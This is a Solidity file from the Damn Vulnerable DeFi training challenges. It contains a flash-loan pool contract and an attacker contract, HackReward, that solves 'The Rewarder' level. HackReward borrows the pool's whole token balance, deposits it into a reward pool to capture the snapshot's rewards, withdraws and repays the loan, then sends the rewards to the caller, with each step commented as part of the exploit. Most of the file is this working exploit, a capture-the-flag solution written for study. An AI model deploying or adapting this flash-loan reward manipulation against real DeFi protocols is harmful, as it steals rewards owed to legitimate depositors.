// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";

/**
 * @title FlashLoanerPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)

 * @dev A simple pool to get flash loans of DVT
 */
contract FlashLoanerPool is ReentrancyGuard {

    using Address for address;

    DamnValuableToken public immutable liquidityToken;

    constructor(address liquidityTokenAddress) {
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
    }

    function flashLoan(uint256 amount) external nonReentrant {
        uint256 balanceBefore = liquidityToken.balanceOf(address(this));
        require(amount <= balanceBefore, "Not enough token balance");

        require(msg.sender.isContract(), "Borrower must be a deployed contract");
        
        liquidityToken.transfer(msg.sender, amount);

        msg.sender.functionCall(
            abi.encodeWithSignature(
                "receiveFlashLoan(uint256)",
                amount
            )
        );

        require(liquidityToken.balanceOf(address(this)) >= balanceBefore, "Flash loan not paid back");
    }
}

import "./TheRewarderPool.sol";
import "./RewardToken.sol";

contract HackReward {
    FlashLoanerPool public pool;
    DamnValuableToken public token;
    TheRewarderPool public rewardPool;
    RewardToken public reward;

    constructor(address _pool, address _token, address _rewardPool, address _reward) {
        pool = FlashLoanerPool(_pool);
        token = DamnValuableToken(_token);
        rewardPool = TheRewarderPool(_rewardPool);
        reward = RewardToken(_reward);
    }

    fallback() external {
        // STEP 2 - Deposit the flashloan to hopefully get the snapshot taken 
        uint bal = token.balanceOf(address(this));

        token.approve(address(rewardPool), bal);
        rewardPool.deposit(bal);
        rewardPool.withdraw(bal);

        token.transfer(address(pool), bal);
    }

    /** EXPLOIT - If we have a huge number of tokens deposited */
    function attack() external {
        // STEP 1 - flash loan the token balance
        pool.flashLoan(token.balanceOf(address(pool)));
        // STEP 3 - transfer the reward tokens distributed on the snapshot, to the attacker
        reward.transfer(msg.sender, reward.balanceOf(address(this)));
    }
}